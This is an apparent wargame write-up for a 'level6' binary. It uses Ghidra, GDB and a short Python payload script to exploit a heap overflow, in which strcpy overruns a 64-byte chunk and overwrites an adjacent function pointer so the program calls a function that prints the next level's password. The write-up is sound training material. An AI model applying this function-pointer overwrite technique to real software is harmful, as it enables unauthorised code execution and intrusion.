---

## Phase 1: Reconnaissance

We find a binary `level6` in our home folder

---

## Phase 2: Static Analysis

Using Ghidra:

```c
int main(int argc, char **argv)
{
    char *buffer = malloc(64);
    void (**function_ptr)() = malloc(4);

    *function_ptr = m;
    
    strcpy(buffer, argv[1]);

    (*function_ptr)();
    
    return 0;
}

- - - - - -

void m(void)
{
  puts("Nope");
}

- - - - - -

void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}
```

We see two malloc calls, one right after the other

Because the heap allocator places small allocations next to each other, we get:

- chunk A (64 bytes): buffer = first malloc
- chunk B (8 bytes) : function_ptr = second malloc

Then the program does:

1. `*function_ptr = m;`
2. `strcpy(buffer, argv[1]);`   (no bounds check, if input > 64 bytes, it keeps writing past chunk A)
3. `(*function_ptr)();`        (indirect call)

This is a classic heap overflow, overflow chunk A to corrupt chunk B

---

## Phase 3: Planning

Initially:

    *function_ptr = m;

So the program calls `m()` which prints:

    Nope

But if we overwrite the 4 bytes stored in `function_ptr` with the address of `n()`, then:

`(*function_ptr)()` will call `n()` instead

And `n()` prints the next password

So the goal is to **overwrite function_ptr with address of n()**

---

## Phase 4: GDB Context

We inspect the malloc calls:

First malloc():
```bash
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
```

Second malloc():
```bash
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
```

So:
- `[esp+0x1c]` holds heap address of buffer
- `[esp+0x18]` holds heap address of function_ptr

After strcpy, the indirect call happens:
```bash
    mov eax, [esp+0x18]   ; eax = function_ptr
    mov eax, [eax]        ; eax = *function_ptr
    call eax              ; jump to it
```

## Phase 4: Inspecting with GDB

For test purposes, let's try overflowing the buffer with AAAA (we should see 41414141)

First, we want to inspect memory after the copy happened

From the disassembly:
  - strcpy is called at `0x080484c5`
  - next instruction is `0x080484ca`

So we break at `0x080484ca`
```bash
    gdb ./level6
    set disassembly-flavor intel
    b *0x080484ca
    run $(python -c 'print("A"*120)')
```
> (We overflow the buffer with Python, 120 is definitely more than 64, so we’ll cross into the next chunk)

We can check what our addresses to the heap are with:
```shell
(gdb) x/wx $esp+0x1c  # pointer to 'buffer'
(gdb) x/wx $esp+0x18  # pointer to 'function_ptr')
```

This gives us
```shell
(gdb) x/wx $esp+0x1c
0x0804a008

(gdb) x/wx $esp+0x18
0x0804a050
```

`0x0804a008` and `0x0804a050` are heap address returned by malloc, and where our data lives

Now we inspect the actual heap memory that those pointers point to:

```shell
(gdb) x/16bx *(void**)($esp+0x1c)  # dump bytes of 'buffer'
(gdb) x/wx *(void**)($esp+0x1c)                         

(gdb) x/16bx *(void**)($esp+0x18)  # dump bytes of 'function_ptr'
(gdb) x/wx *(void**)($esp+0x18)                         
```

- If overflow did not reach the second chunk (function_ptr), we will still see an address
- If instead it did, it overwrote the first 4 bytes so we’ll see `0x41414141`

Now we verify what will actually be called

From GDB:
```bash
=> 0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18] ; eax = function_ptr
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]      ; eax = *function_ptr
   0x080484d0 <+84>:	call   eax                      ; jump to it
```

So right before the last instruction `call eax`, we run
```shell
(gdb) i r
eax            0x41414141	1094795585
```
So it will try to jump to `0x41414141` and segfault

---

## Phase 5: Finding the Offset

Now that we proved we can corrupt the indirect call target (eax = 0x41414141), we need the exact number of bytes before we overwrite *function_ptr

We use `https://wiremask.eu/tools/buffer-overflow-pattern-generator` to generate a pattern to find the offset

We go right before the last instruction `call eax` and check it:
```shell
eax            0x41346341	1093952321
```

Resolving this pattern gives:

    0x41346341 = 72

So after 72 bytes, the next 4 bytes overwrite *function_ptr

---

## Phase 6: Getting the Address of n()

Inside GDB:
```shell
(gdb) info functions n

...
0x08048454  n
0x0804847c  main
...
```

`0x08048454` is the address of `n()`

In little endian:

    \x54\x84\x04\x08

---

## Phase 7: Building the Exploit

Payload structure:

    [72 bytes padding][address of n()]

Exploit script:

```python
#!/usr/bin/env python2
import os


padding = 'A' * 72;
address = '\x54\x84\x04\x08' # address of n 0x08048454

payload = padding + address

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
    
print("Saved to /tmp/payload")
```

---

## Phase 8: Exploit

We can't use the previous `cat /tmp/payload | ./level6` because this sends bytes to stdin

And our program requires argv[1]

So we execute:

    ./level6 "$(cat /tmp/payload)"

This overwrites function_ptr with address of n()

The program calls n(), which executes:

    /bin/cat /home/user/level7/.pass
